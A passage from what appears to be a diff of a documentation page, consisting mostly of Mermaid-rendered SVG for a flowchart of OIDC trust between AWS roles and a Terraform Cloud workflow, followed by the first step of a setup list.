marker-end="url(#flowchart-pointEnd)" style="fill:none;" class="edge-thickness-normal edge-pattern-solid flowchart-link LS-Token LE-Terraform" id="L-Token-Terraform-0" d="M85.91019081858407,235.75L98.37047151548673,247.125C110.83075221238937,258.5,135.75131360619469,281.25,164.46289638643069,292.625C193.17447916666666,304,225.67708333333334,304,258.1796875,304C290.6822916666667,304,323.1848958333333,304,359.3528645833333,304C395.5208333333333,304,435.3541666666667,304,475.1875,304C515.0208333333334,304,554.8541666666666,304,585.6956312991642,296.7916666666667C616.5370959316618,289.5833333333333,638.3866918633236,275.1666666666667,649.3114898291544,267.9583333333333L660.2362877949853,260.75"></path><path marker-end="url(#flowchart-pointEnd)" style="fill:none;" class="edge-thickness-normal edge-pattern-solid flowchart-link LS-Terraform LE-JWT" id="L-Terraform-JWT-0" d="M660.2362877949853,177.75L649.3114898291544,170.54166666666666C638.3866918633236,163.33333333333334,616.5370959316618,148.91666666666666,601.4456312991642,141.70833333333334C586.3541666666666,134.5,578.0208333333334,134.5,573.8541666666666,134.5L569.6875,134.5"></path><path marker-end="url(#flowchart-pointEnd)" style="fill:none;" class="edge-thickness-normal edge-pattern-solid flowchart-link LS-JWT LE-AWS" id="L-JWT-AWS-0" d="M380.6875,134.5L376.5208333333333,134.5C372.3541666666667,134.5,364.0208333333333,134.5,355.6875,134.5C347.3541666666667,134.5,339.0208333333333,134.5,334.8541666666667,134.5L330.6875,134.5"></path></g><g class="edgeLabels"><g class="edgeLabel"><g transform="translate(0, 0)" class="label"><foreignObject height="0" width="0"><div style="display: inline-block; white-space: nowrap;" xmlns="http://www.w3.org/1999/xhtml"><span class="edgeLabel"></span></div></foreignObject></g></g><g class="edgeLabel"><g transform="translate(0, 0)" class="label"><foreignObject height="0" width="0"><div style="display: inline-block; white-space: nowrap;" xmlns="http://www.w3.org/1999/xhtml"><span class="edgeLabel"></span></div></foreignObject></g></g><g class="edgeLabel"><g transform="translate(0, 0)" class="label"><foreignObject height="0" width="0"><div style="display: inline-block; white-space: nowrap;" xmlns="http://www.w3.org/1999/xhtml"><span class="edgeLabel"></span></div></foreignObject></g></g><g class="edgeLabel"><g transform="translate(0, 0)" class="label"><foreignObject height="0" width="0"><div style="display: inline-block; white-space: nowrap;" xmlns="http://www.w3.org/1999/xhtml"><span class="edgeLabel"></span></div></foreignObject></g></g></g><g class="nodes"><g transform="translate(621.1171875, 169.75)" class="root"><g class="clusters"><g id="Terraform" class="cluster default"><rect height="83" width="206.890625" y="8" x="-0.9296875" ry="0" rx="0" style=""></rect><g transform="translate(-0.9296875, 8)" class="cluster-label"><foreignObject height="18" width="206.890625"><div style="display: inline-block; white-space: nowrap;" xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel">Terraform Cloud Workflow #2</span></div></foreignObject></g></g></g><g class="edgePaths"></g><g class="edgeLabels"></g><g class="nodes"><g transform="translate(102.515625, 49.5)" id="flowchart-OIDCProvider-23" class="node default default"><rect height="33" width="119.03125" y="-16.5" x="-59.515625" ry="0" rx="0" style="" class="basic label-container"></rect><g transform="translate(-52.015625, -9)" style="" class="label"><foreignObject height="18" width="104.03125"><div style="display: inline-block; white-space: nowrap;" xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel">OIDC Provider</span></div></foreignObject></g></g></g></g><g transform="translate(178.171875, -8)" class="root"><g class="clusters"><g id="AWS" class="cluster default"><rect height="269" width="145.015625" y="8" x="8" ry="0" rx="0" style=""></rect><g transform="translate(51.4609375, 8)" class="cluster-label"><foreignObject height="18" width="58.09375"><div style="display: inline-block; white-space: nowrap;" xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel">AWS #1</span></div></foreignObject></g></g></g><g class="edgePaths"></g><g class="edgeLabels"></g><g class="nodes"><g transform="translate(80.5078125, 59.5)" id="flowchart-OIDC-20" class="node default default"><rect height="33" width="95.015625" y="-16.5" x="-47.5078125" ry="0" rx="0" style="" class="basic label-container"></rect><g transform="translate(-40.0078125, -9)" style="" class="label"><foreignObject height="18" width="80.015625"><div style="display: inline-block; white-space: nowrap;" xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel">OIDC Trust</span></div></foreignObject></g></g><g transform="translate(80.5078125, 142.5)" id="flowchart-Roles-21" class="node default default"><rect height="33" width="55.90625" y="-16.5" x="-27.953125" ry="0" rx="0" style="" class="basic label-container"></rect><g transform="translate(-20.453125, -9)" style="" class="label"><foreignObject height="18" width="40.90625"><div style="display: inline-block; white-space: nowrap;" xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel">Roles</span></div></foreignObject></g></g><g transform="translate(80.5078125, 225.5)" id="flowchart-Resources-22" class="node default default"><rect height="33" width="91.484375" y="-16.5" x="-45.7421875" ry="0" rx="0" style="" class="basic label-container"></rect><g transform="translate(-38.2421875, -9)" style="" class="label"><foreignObject height="18" width="76.484375"><div style="display: inline-block; white-space: nowrap;" xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel">Resources</span></div></foreignObject></g></g></g></g><g transform="translate(67.8359375, 219.25)" id="flowchart-Token-25" class="node default default"><rect height="33" width="135.671875" y="-16.5" x="-67.8359375" ry="0" rx="0" style="" class="basic label-container"></rect><g transform="translate(-60.3359375, -9)" style="" class="label"><foreignObject height="18" width="120.671875"><div style="display: inline-block; white-space: nowrap;" xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel">Access Token #4</span></div></foreignObject></g></g><g transform="translate(475.1875, 134.5)" id="flowchart-JWT-28" class="node default default"><rect height="33" width="189" y="-16.5" x="-94.5" ry="0" rx="0" style="" class="basic label-container"></rect><g transform="translate(-87, -9)" style="" class="label"><foreignObject height="18" width="174"><div style="display: inline-block; white-space: nowrap;" xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel">JWT &#x26; Cloud Role ID #3</span></div></foreignObject></g></g></g></g></g></svg></div>
+<div class="remark-mermaid remark-mermaid-default"><svg aria-roledescription="flowchart-v2" role="graphics-document document" viewBox="-8 -8 827.9453125 321.5" style="max-width: 827.945px; background-color: transparent;" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns="http://www.w3.org/2000/svg" width="100%" id="mermaid-1699019101306"><style>#mermaid-1699019101306{font-family:"trebuchet ms",verdana,arial,sans-serif;font-size:16px;fill:#333;}#mermaid-1699019101306 .error-icon{fill:#552222;}#mermaid-1699019101306 .error-text{fill:#552222;stroke:#552222;}#mermaid-1699019101306 .edge-thickness-normal{stroke-width:2px;}#mermaid-1699019101306 .edge-thickness-thick{stroke-width:3.5px;}#mermaid-1699019101306 .edge-pattern-solid{stroke-dasharray:0;}#mermaid-1699019101306 .edge-pattern-dashed{stroke-dasharray:3;}#mermaid-1699019101306 .edge-pattern-dotted{stroke-dasharray:2;}#mermaid-1699019101306 .marker{fill:#333333;stroke:#333333;}#mermaid-1699019101306 .marker.cross{stroke:#333333;}#mermaid-1699019101306 svg{font-family:"trebuchet ms",verdana,arial,sans-serif;font-size:16px;}#mermaid-1699019101306 .label{font-family:"trebuchet ms",verdana,arial,sans-serif;color:#333;}#mermaid-1699019101306 .cluster-label text{fill:#333;}#mermaid-1699019101306 .cluster-label span{color:#333;}#mermaid-1699019101306 .label text,#mermaid-1699019101306 span{fill:#333;color:#333;}#mermaid-1699019101306 .node rect,#mermaid-1699019101306 .node circle,#mermaid-1699019101306 .node ellipse,#mermaid-1699019101306 .node polygon,#mermaid-1699019101306 .node path{fill:#ECECFF;stroke:#9370DB;stroke-width:1px;}#mermaid-1699019101306 .node .label{text-align:center;}#mermaid-1699019101306 .node.clickable{cursor:pointer;}#mermaid-1699019101306 .arrowheadPath{fill:#333333;}#mermaid-1699019101306 .edgePath .path{stroke:#333333;stroke-width:2.0px;}#mermaid-1699019101306 .flowchart-link{stroke:#333333;fill:none;}#mermaid-1699019101306 .edgeLabel{background-color:#e8e8e8;text-align:center;}#mermaid-1699019101306 .edgeLabel rect{opacity:0.5;background-color:#e8e8e8;fill:#e8e8e8;}#mermaid-1699019101306 .cluster rect{fill:#ffffde;stroke:#aaaa33;stroke-width:1px;}#mermaid-1699019101306 .cluster text{fill:#333;}#mermaid-1699019101306 .cluster span{color:#333;}#mermaid-1699019101306 div.mermaidTooltip{position:absolute;text-align:center;max-width:200px;padding:2px;font-family:"trebuchet ms",verdana,arial,sans-serif;font-size:12px;background:hsl(80, 100%, 96.2745098039%);border:1px solid #aaaa33;border-radius:2px;pointer-events:none;z-index:100;}#mermaid-1699019101306 .flowchartTitleText{text-anchor:middle;font-size:18px;fill:#333;}#mermaid-1699019101306 :root{--mermaid-font-family:"trebuchet ms",verdana,arial,sans-serif;}</style><g><marker orient="auto" markerHeight="12" markerWidth="12" markerUnits="userSpaceOnUse" refY="5" refX="10" viewBox="0 0 12 20" class="marker flowchart" id="flowchart-pointEnd"><path style="stroke-width: 1; stroke-dasharray: 1, 0;" class="arrowMarkerPath" d="M 0 0 L 10 5 L 0 10 z"></path></marker><marker orient="auto" markerHeight="12" markerWidth="12" markerUnits="userSpaceOnUse" refY="5" refX="0" viewBox="0 0 10 10" class="marker flowchart" id="flowchart-pointStart"><path style="stroke-width: 1; stroke-dasharray: 1, 0;" class="arrowMarkerPath" d="M 0 5 L 10 10 L 10 0 z"></path></marker><marker orient="auto" markerHeight="11" markerWidth="11" markerUnits="userSpaceOnUse" refY="5" refX="11" viewBox="0 0 10 10" class="marker flowchart" id="flowchart-circleEnd"><circle style="stroke-width: 1; stroke-dasharray: 1, 0;" class="arrowMarkerPath" r="5" cy="5" cx="5"></circle></marker><marker orient="auto" markerHeight="11" markerWidth="11" markerUnits="userSpaceOnUse" refY="5" refX="-1" viewBox="0 0 10 10" class="marker flowchart" id="flowchart-circleStart"><circle style="stroke-width: 1; stroke-dasharray: 1, 0;" class="arrowMarkerPath" r="5" cy="5" cx="5"></circle></marker><marker orient="auto" markerHeight="11" markerWidth="11" markerUnits="userSpaceOnUse" refY="5.2" refX="12" viewBox="0 0 11 11" class="marker cross flowchart" id="flowchart-crossEnd"><path style="stroke-width: 2; stroke-dasharray: 1, 0;" class="arrowMarkerPath" d="M 1,1 l 9,9 M 10,1 l -9,9"></path></marker><marker orient="auto" markerHeight="11" markerWidth="11" markerUnits="userSpaceOnUse" refY="5.2" refX="-1" viewBox="0 0 11 11" class="marker cross flowchart" id="flowchart-crossStart"><path style="stroke-width: 2; stroke-dasharray: 1, 0;" class="arrowMarkerPath" d="M 1,1 l 9,9 M 10,1 l -9,9"></path></marker><g class="root"><g class="clusters"></g><g class="edgePaths"><path marker-end="url(#flowchart-pointEnd)" style="fill:none;" class="edge-thickness-normal edge-pattern-solid flowchart-link LS-AWS LE-Token" id="L-AWS-Token-0" d="M179.515625,135.25L175.34895833333334,135.25C171.18229166666666,135.25,162.84895833333334,135.25,146.6662555830886,146.64583333333334C130.48355283284386,158.04166666666666,106.45148066568771,180.83333333333334,94.43544458210964,192.22916666666666L82.41940849853157,203.625"></path><path marker-end="url(#flowchart-pointEnd)" style="fill:none;" class="edge-thickness-normal edge-pattern-solid flowchart-link LS-Token LE-Terraform" id="L-Token-Terraform-0" d="M82.41940849853157,237.125L94.43544458210964,248.52083333333334C106.45148066568771,259.9166666666667,130.48355283284386,282.7083333333333,158.28800037475526,294.1041666666667C186.09244791666666,305.5,217.66927083333334,305.5,249.24609375,305.5C280.8229166666667,305.5,312.3997395833333,305.5,347.5989583333333,305.5C382.7981770833333,305.5,421.6197916666667,305.5,460.44140625,305.5C499.2630208333333,305.5,538.0846354166666,305.5,568.5160074033284,298.2708333333333C598.9473793899903,291.0416666666667,620.9885087799804,276.5833333333333,632.0090734749756,269.3541666666667L643.0296381699707,262.125"></path><path marker-end="url(#flowchart-pointEnd)" style="fill:none;" class="edge-thickness-normal edge-pattern-solid flowchart-link LS-Terraform LE-JWT" id="L-Terraform-JWT-0" d="M643.0296381699707,178.625L632.0090734749756,171.39583333333334C620.9885087799804,164.16666666666666,598.9473793899903,149.70833333333334,583.7601480283284,142.47916666666666C568.5729166666666,135.25,560.2395833333334,135.25,556.0729166666666,135.25L551.90625,135.25"></path><path marker-end="url(#flowchart-pointEnd)" style="fill:none;" class="edge-thickness-normal edge-pattern-solid flowchart-link LS-JWT LE-AWS" id="L-JWT-AWS-0" d="M368.9765625,135.25L364.8098958333333,135.25C360.6432291666667,135.25,352.3098958333333,135.25,343.9765625,135.25C335.6432291666667,135.25,327.3098958333333,135.25,323.1432291666667,135.25L318.9765625,135.25"></path></g><g class="edgeLabels"><g class="edgeLabel"><g transform="translate(0, 0)" class="label"><foreignObject height="0" width="0"><div style="display: inline-block; white-space: nowrap;" xmlns="http://www.w3.org/1999/xhtml"><span class="edgeLabel"></span></div></foreignObject></g></g><g class="edgeLabel"><g transform="translate(0, 0)" class="label"><foreignObject height="0" width="0"><div style="display: inline-block; white-space: nowrap;" xmlns="http://www.w3.org/1999/xhtml"><span class="edgeLabel"></span></div></foreignObject></g></g><g class="edgeLabel"><g transform="translate(0, 0)" class="label"><foreignObject height="0" width="0"><div style="display: inline-block; white-space: nowrap;" xmlns="http://www.w3.org/1999/xhtml"><span class="edgeLabel"></span></div></foreignObject></g></g><g class="edgeLabel"><g transform="translate(0, 0)" class="label"><foreignObject height="0" width="0"><div style="display: inline-block; white-space: nowrap;" xmlns="http://www.w3.org/1999/xhtml"><span class="edgeLabel"></span></div></foreignObject></g></g></g><g class="nodes"><g transform="translate(607.33984375, 170.625)" class="root"><g class="clusters"><g id="Terraform" class="cluster default"><rect height="83.5" width="209.5390625" y="8" x="-4.93359375" ry="0" rx="0" style=""></rect><g transform="translate(-4.93359375, 8)" class="cluster-label"><foreignObject height="18.5" width="209.5390625"><div style="display: inline-block; white-space: nowrap;" xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel">Terraform Cloud Workflow #2</span></div></foreignObject></g></g></g><g class="edgePaths"></g><g class="edgeLabels"></g><g class="nodes"><g transform="translate(99.8359375, 49.75)" id="flowchart-OIDCProvider-23" class="node default default"><rect height="33.5" width="113.671875" y="-16.75" x="-56.8359375" ry="0" rx="0" style="" class="basic label-container"></rect><g transform="translate(-49.3359375, -9.25)" style="" class="label"><foreignObject height="18.5" width="98.671875"><div style="display: inline-block; white-space: nowrap;" xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel">OIDC Provider</span></div></foreignObject></g></g></g></g><g transform="translate(172.015625, -8)" class="root"><g class="clusters"><g id="AWS" class="cluster default"><rect height="270.5" width="139.4609375" y="8" x="8" ry="0" rx="0" style=""></rect><g transform="translate(52.25, 8)" class="cluster-label"><foreignObject height="18.5" width="50.9609375"><div style="display: inline-block; white-space: nowrap;" xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel">AWS #1</span></div></foreignObject></g></g></g><g class="edgePaths"></g><g class="edgeLabels"></g><g class="nodes"><g transform="translate(77.73046875, 59.75)" id="flowchart-OIDC-20" class="node default default"><rect height="33.5" width="89.4609375" y="-16.75" x="-44.73046875" ry="0" rx="0" style="" class="basic label-container"></rect><g transform="translate(-37.23046875, -9.25)" style="" class="label"><foreignObject height="18.5" width="74.4609375"><div style="display: inline-block; white-space: nowrap;" xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel">OIDC Trust</span></div></foreignObject></g></g><g transform="translate(77.73046875, 143.25)" id="flowchart-Roles-21" class="node default default"><rect height="33.5" width="52.171875" y="-16.75" x="-26.0859375" ry="0" rx="0" style="" class="basic label-container"></rect><g transform="translate(-18.5859375, -9.25)" style="" class="label"><foreignObject height="18.5" width="37.171875"><div style="display: inline-block; white-space: nowrap;" xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel">Roles</span></div></foreignObject></g></g><g transform="translate(77.73046875, 226.75)" id="flowchart-Resources-22" class="node default default"><rect height="33.5" width="85.5390625" y="-16.75" x="-42.76953125" ry="0" rx="0" style="" class="basic label-container"></rect><g transform="translate(-35.26953125, -9.25)" style="" class="label"><foreignObject height="18.5" width="70.5390625"><div style="display: inline-block; white-space: nowrap;" xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel">Resources</span></div></foreignObject></g></g></g></g><g transform="translate(64.7578125, 220.375)" id="flowchart-Token-25" class="node default default"><rect height="33.5" width="129.515625" y="-16.75" x="-64.7578125" ry="0" rx="0" style="" class="basic label-container"></rect><g transform="translate(-57.2578125, -9.25)" style="" class="label"><foreignObject height="18.5" width="114.515625"><div style="display: inline-block; white-space: nowrap;" xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel">Access Token #4</span></div></foreignObject></g></g><g transform="translate(460.44140625, 135.25)" id="flowchart-JWT-28" class="node default default"><rect height="33.5" width="182.9296875" y="-16.75" x="-91.46484375" ry="0" rx="0" style="" class="basic label-container"></rect><g transform="translate(-83.96484375, -9.25)" style="" class="label"><foreignObject height="18.5" width="167.9296875"><div style="display: inline-block; white-space: nowrap;" xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel">JWT &#x26; Cloud Role ID #3</span></div></foreignObject></g></g></g></g></g></svg></div>
 <ol>
 <li>In AWS, create an OIDC trust between a role and our terraform cloud
 workflow(s) that need access to the cloud.</li>
